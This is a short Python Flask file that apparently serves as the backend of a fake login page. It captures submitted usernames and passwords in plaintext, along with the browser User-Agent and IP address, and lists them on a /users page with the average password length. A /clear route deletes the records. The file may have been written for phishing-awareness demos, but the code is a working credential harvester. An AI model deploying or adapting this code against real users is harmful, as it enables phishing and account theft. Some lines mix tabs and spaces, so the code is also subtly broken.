# -*- encoding: utf-8 -*-
"""
Autor: alexfrancow
"""

#################
#### imports ####
#################

from flask import Flask, Blueprint, render_template, request, redirect
from flask import jsonify
import sqlite3 as sql
import datetime
import httpagentparser

####################
#### blueprints ####
####################

login_blueprint = Blueprint('login', __name__, template_folder='templates')
users_blueprint = Blueprint('users', __name__, template_folder='templates')
clear_blueprint = Blueprint('clear', __name__, template_folder='templates')
admin_blueprint = Blueprint('admin', __name__, template_folder='templates')

################
#### config ####
################

app = Flask(__name__)

###################
#### functions ####
###################

def insert_readings(user, passwd, time, UA, remote_IP):
    DATABASE = 'test.db'
    with sql.connect(DATABASE) as con:
        cur = con.cursor()
        #cur.execute("CREATE TABLE users (user TEXT, passwd TEXT, time DATETIME)")
        #cur.execute("alter table users add column time DATETIME")
        #cur.execute("alter table users add column UA TEXT")
	#cur.execute("alter table users add column remote_IP TEXT")
        cur.execute("INSERT INTO users (user, passwd, time, UA, remote_IP) VALUES (?,?,?,?,?)", (user, passwd, time, UA, remote_IP))
        con.commit()

################
#### routes ####
################

@login_blueprint.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form['user']
        passwd = request.form['passwd']
        currentDT = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        time = str(currentDT)
        UA = request.headers.get('User-Agent')
        UA = httpagentparser.simple_detect(UA)
        UA = ' '.join(UA)
	remote_IP = request.remote_addr
        print (UA)
        insert_readings(user, passwd, time, UA, remote_IP)
	print(remote_IP)
        return redirect("/users")

    return render_template('index2.html')

@users_blueprint.route('/users', methods=['GET'])
def users():
    DATABASE = 'test.db'
    with sql.connect(DATABASE) as con:
        cur = con.cursor()
        cur2 = con.cursor()
        res = cur.execute("SELECT * FROM users")
        res2 = cur2.execute("SELECT AVG(length(passwd)) FROM users")
        return render_template('users.html', users=res.fetchall(), passwdAvg=res2.fetchone())


@clear_blueprint.route('/clear', methods=['GET'])
def clear():
    DATABASE = 'test.db'
    with sql.connect(DATABASE) as con:
        cur = con.cursor()
        res = cur.execute("DELETE FROM users")
        return render_template('clear.html')

@admin_blueprint.route('/admin', methods=['GET'])
def admin():
    return  render_template('admin.html')

if __name__ == '__main__':
    app.run(debug= True)

